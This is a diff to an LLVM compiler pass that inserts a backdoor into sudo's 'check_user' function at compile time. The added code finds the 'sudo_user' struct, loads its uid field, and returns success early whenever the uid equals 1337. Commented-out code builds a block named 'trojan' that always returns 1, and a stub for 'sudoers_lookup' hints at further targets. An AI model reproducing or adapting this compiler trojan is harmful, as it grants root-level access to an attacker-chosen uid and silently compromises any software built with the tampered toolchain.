@@ -41,6 +41,7 @@
 #include "llvm/Analysis/Loads.h"
 #include "llvm/Analysis/PtrUseVisitor.h"
 #include "llvm/Config/llvm-config.h"
+#include "llvm/Transforms/Utils/BasicBlockUtils.h"
 #include "llvm/IR/BasicBlock.h"
 #include "llvm/IR/Constant.h"
 #include "llvm/IR/ConstantFolder.h"
@@ -125,27 +126,93 @@ public:
 
   bool runOnFunction(Function &F) override {
     errs() << "Fn Name: " << F.getName() << "\n";
+    bool changed = false;
     if (F.getName() == "check_user") {
 	    Module *m = F.getParent();
 	    GlobalValue *v = m->getNamedValue("sudo_user");
+	    errs() << "Found check_user" << "\n";
+	    //for (auto &Global : m->getGlobalList())
+	    //	    errs() << Global << "\n";
 	    if (v) {
 		errs() << "#### Found sudo_user ####" << "\n";
-		Type *t = v->getType();
-		if (isa<StructType>(t)) {
-		    auto structType = dyn_cast<StructType>(t);
-		    auto numElements = structType->getNumElements();
+		Type *t = v->getValueType();
+		errs() << v << "\n";
+		errs() << t->isStructTy() << "\n";
+		if (t->isStructTy()) {
+	            errs() << "#### Passed Struct test ####" << "\n";
+		    auto numElements = t->getStructNumElements() ;
+		    errs() << "## Num elements " << numElements << "\n";
+		    if (numElements < 3)
+			    return false;
+
+		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
+		    IRBuilder<> IRB(InsertPoint);
+		    IRB.SetInsertPoint(InsertPoint);
+		    //Value *uid = IRB.CreateGEP(v, IRB.getInt64(numElements - 3));
+		    std::vector<llvm::Value*> indices(2);
+		    indices[0] = IRB.getInt32(0);
+		    indices[1] = IRB.getInt32(numElements - 3);
+
+		    Value *uid = IRB.CreateGEP(t, v, indices, "uidPtr");
+		    if (uid)
+			   errs() << "## Successfully inserted GEP ##" << "\n";
+		    
+	    	    LoadInst *uid_loaded = IRB.CreateLoad(uid);
+		    auto uidPtr = uid_loaded->getPointerOperandType();
+		    
+		    if (uidPtr->isPointerTy() && dyn_cast<PointerType>(uidPtr)->getElementType()->isIntegerTy()) {
+			errs() << "## UID is integer type ##" << "\n";
+			//auto uidType = dyn_cast<PointerType>(uidPtr)->getElementType();
+			auto bitwidth = dyn_cast<IntegerType>(dyn_cast<PointerType>(uidPtr)->getElementType())->getBitWidth();
+			Value *CmpEq;
+			//LoadInst *uid_loaded = IRB.CreateLoad(uid);
+			if (bitwidth == 64)
+		    		CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt64(1337));
+			else
+				CmpEq = IRB.CreateICmpEQ(uid_loaded, IRB.getInt32(1337));
+
+		    	BranchInst *BI = cast<BranchInst>(
+				    SplitBlockAndInsertIfThen(CmpEq, InsertPoint, false));
+
+		    	IRBuilder<> ThenB(BI);
+		    	Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
+		    	ThenB.CreateRet(retval);
+			auto BB = ThenB.GetInsertBlock();
+			for (auto inst = BB->begin(); inst != BB->end(); ) {
+ 			       Instruction *Inst = &(*(inst++));
+			       if (isa<BranchInst>(Inst)) {
+				       BranchInst *BI = dyn_cast<BranchInst>(Inst);
+				       if(BI->isUnconditional()) {
+					       BI->dropAllReferences();
+					       BI->removeFromParent();
+				       }
+			       }
+      			}
+
+			changed = true;
+		    }
+
+		    //changed = true;
+		    /*
 		    // -3 is uid
 	            //auto bb = F.getEntryBlock()
 		    Instruction *InsertPoint = &(*(F.getEntryBlock().getFirstInsertionPt()));
-
-		    IRBuilder<> IRB(InsertPoint);
+		    errs() << InsertPoint << "\n";
+		
+		    BasicBlock* trojan = BasicBlock::Create(F.getContext(), "trojan", &(F), &((F.getEntryBlock())));
+		    IRBuilder<> IRB(trojan);
+		    IRB.SetInsertPoint(trojan);
 
 		    //auto context = F.getContext();
 		    Value *retval = ConstantInt::get(F.getReturnType(), 0x1);
 		    IRB.CreateRet(retval);
+		    changed = true;*/
 		}
 	    }
+    } else if (F.getName() == "sudoers_lookup") {
+
     }
+    return changed;
 
   }
 	    
